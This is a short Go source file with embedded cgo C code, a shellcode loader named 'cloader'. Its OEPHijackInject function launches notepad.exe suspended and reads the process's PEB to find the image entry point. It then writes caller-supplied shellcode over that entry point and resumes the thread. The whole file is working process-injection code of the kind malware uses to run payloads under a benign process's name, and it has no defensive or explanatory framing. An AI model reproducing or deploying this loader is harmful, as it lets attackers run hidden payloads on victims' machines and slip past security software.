package cloader

/*
#cgo LDFLAGS: -lntdll
#include <windows.h>
#include <winternl.h>

void OEP(uintptr_t p, int len) {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    DWORD returnLength = 0;

    // 创建目标进程并挂起
    if (!CreateProcessA(NULL, "C:\\windows\\system32\\notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return;
    }

    // 获取进程的 PEB 地址
    if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength) != SCARD_S_SUCCESS) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

#ifdef _M_X64
    LONGLONG imageBaseOffset = (LONGLONG)pbi.PebBaseAddress + 16;
    // 读取图像基址
    LPVOID imageBase = NULL;
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)imageBaseOffset, &imageBase, sizeof(imageBase), NULL)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }
    BYTE headersBuffer[4096] = { 0 };
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer, sizeof(headersBuffer), NULL)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
    LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (LONGLONG)imageBase);
#else
    DWORD imageBaseOffset = (DWORD)pbi.PebBaseAddress + 8;
    // 读取图像基址
    LPVOID imageBase = NULL;
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)imageBaseOffset, &imageBase, sizeof(imageBase), NULL)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }
    BYTE headersBuffer[4096] = { 0 };
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer, sizeof(headersBuffer), NULL)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
    LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD)imageBase);
#endif // x64

    // 将 shellcode 写入图像入口点
    if (!WriteProcessMemory(pi.hProcess, codeEntry, (LPCVOID)p, len, NULL)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    // 恢复线程执行
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        return;
    }

    // 关闭句柄
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
*/
import "C"
import "unsafe"

func OEPHijackInject(p []byte) {
	C.OEP((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
